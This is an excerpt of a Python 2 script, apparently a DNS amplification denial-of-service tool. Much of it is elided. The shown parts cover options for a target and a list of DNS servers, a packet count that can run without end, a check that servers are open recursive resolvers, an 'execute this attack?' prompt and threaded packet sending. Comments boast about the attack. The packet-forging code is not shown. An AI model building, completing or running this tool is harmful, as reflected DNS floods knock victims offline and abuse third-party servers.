...
print "###                                                     ###"
print "###   Co-Authored    :   LISTERINe and kelevrA          ###"
...
if not options.target or not options.servers or not options.arecords:
	...
	print "-c           :   -1 for infinate, \# of times to send packets"
	print "--verify     :   Verify that DNS servers are indeed recursive"
	print "-v           :   Set verobosity to true"
	...
	proof=lower(raw_input("Are you sure you want to execute this sttack?  (Y/N)"))
...
#####
#####################################################
# Sanitization code for our DNS amplification script
#####################################################
#####
##
...
def pull_clean_servers(server_filename, verbose):
	...
	# For each server in our serverlise (see above), clean it
	clean	=	[]
...
def verify_ns(nslist, verbose):
	...
	for server in nslist:
		try:
			...
			if verbose:
				print "Server "+server+" is resursive"
...
#####
####################################################
# Thread Class to handour our Multi Threading
####################################################
#####
##
...
# Assign vars to be used in our threads. We'll do this one at a time to see where shit breaks if it does
try:
...
# Alright, so now we've got our shit sanitized... Do we need to verify our name servers?
if options.verify:
	try:
...
# So here we go, lets fire up some threads :D Winning!
sendthreads = []
